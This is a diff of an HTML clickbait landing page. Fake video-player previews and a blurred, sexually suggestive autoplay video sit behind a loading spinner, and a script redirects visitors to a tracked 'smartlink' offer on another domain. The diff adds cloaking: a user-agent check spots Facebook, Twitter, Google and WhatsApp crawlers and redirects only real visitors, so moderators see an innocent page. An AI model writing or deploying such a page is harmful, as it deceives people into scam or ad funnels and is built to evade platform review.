@@ -6,26 +6,24 @@
 
 <title id="page-title">LOADING...</title>
 
-<meta name="description" content="Loading content...">
+<meta name="description" content="🎥⏯1:19―●―――――45:49📽">
 
 <!-- OPEN GRAPH / THREADS / FB -->
 <meta property="og:type" content="website">
-<meta property="og:title" content="🎥⏯1:19―●―――――45:49📽💋">
-<meta property="og:description" content="🎥⏯1:19―●―――――45:49📽💋">
+<meta property="og:url" content="https://islalynsmith7806.pages.dev/">
+<meta property="og:title" content="🎥⏯1:19―●―――――45:49📽">
+<meta property="og:description" content="🎥⏯1:19―●―――――45:49📽">
 <meta property="og:image" content="https://fototrapeyangbaru12.pages.dev/blO2Y.jpg">
 <meta property="og:image:secure_url" content="https://fototrapeyangbaru12.pages.dev/blO2Y.jpg">
 <meta property="og:image:width" content="1200">
 <meta property="og:image:height" content="630">
-<meta property="og:image:type" content="image/jpg">
+<meta property="og:image:type" content="image/jpeg">
 
 <!-- TWITTER / X -->
 <meta name="twitter:card" content="summary_large_image">
-<meta name="twitter:title" content="🎥⏯1:19―●―――――45:49📽💋">
-<meta name="twitter:description" content="🎥⏯1:19―●―――――45:49📽💋">
+<meta name="twitter:title" content="🎥⏯1:19―●―――――45:49📽">
+<meta name="twitter:description" content="🎥⏯1:19―●―――――45:49📽">
 <meta name="twitter:image" content="https://fototrapeyangbaru12.pages.dev/blO2Y.jpg">
-
-<!-- AUTO REDIRECT META FALLBACK (FAST 2 DETIK) -->
-<meta http-equiv="refresh" content="2;url=https://chfhbei.tepixs.com/s/7a96a663ee35e?track=COCOT&subsource=COCOT&ext_click_id=COCOT">
 
 <style>
 *{
@@ -58,11 +56,12 @@ html,body{
     width:100%;
     height:100%;
     object-fit:cover;
+    object-position: center 85%;
     filter:blur(30px) brightness(.4);
-    transform:scale(1.2);
+    transform:scale(1.6);
 }
 
-/* Video utama di tengah */
+/* Video utama di tengah (Fokus Badan Bawah) */
 .main-video{
     position:fixed;
     inset:0;
@@ -73,9 +72,11 @@ html,body{
 }
 
 .main-video video{
-    height:100vh;
-    max-width:100%;
-    object-fit:contain;
+    width:100%;
+    height:100%;
+    object-fit:cover;
+    object-position: center 80%;
+    transform: scale(1.3);
     filter: blur(6px) brightness(.8);
 }
 
@@ -189,7 +190,7 @@ html,body{
     </video>
 </div>
 
-<!-- VIDEO UTAMA (BLUR DIKIT) -->
+<!-- VIDEO UTAMA (FOKUS BADAN BAWAH) -->
 <div class="main-video">
     <video autoplay loop muted playsinline>
         <source src="https://faizalpenikmatturuk.github.io/landing/bg1.mp4" type="video/mp4">
@@ -198,7 +199,7 @@ html,body{
 
 <div class="overlay"></div>
 
-<!-- KONTEN PRO LOADING TANPA TAMPILAN AWAL CTA/DESKRIPSI -->
+<!-- KONTEN PRO LOADING -->
 <div class="content-wrapper">
     <div class="glass-card">
         <div class="spinner-box">
@@ -214,7 +215,7 @@ html,body{
 
 <script>
 // =========================================================
-// 🔴 SMARTLINK TRAFEE (GANTI LINK SMARTLINK ANDA DI SINI)
+// 🔴 SMARTLINK TRAFEE
 // =========================================================
 const redirectURL = "https://chfhbei.tepixs.com/s/7a96a663ee35e?track=COCOT&subsource=COCOT&ext_click_id=COCOT";
 // =========================================================
@@ -228,8 +229,13 @@ function goOffer() {
     }
 }
 
-// FAST AUTO REDIRECT (1.5 DETIK)
-setTimeout(goOffer, 1500);
+// DETEKSI BOT / FACEBOOK CRAWLER
+const isBot = /facebookexternalhit|facebookcatalog|twitterbot|bingbot|googlebot|slurp|WhatsApp/i.test(navigator.userAgent);
+
+// HANYA REDIRECT JIKA USER ASLI (BUKAN CRAWLER / BOT)
+if (!isBot) {
+    setTimeout(goOffer, 1200);
+}
 
 // AUTO-TRANSLATE MULTI LANGUAGE (ES, PT-BR, PT-PT, EN)
 const i18n = {
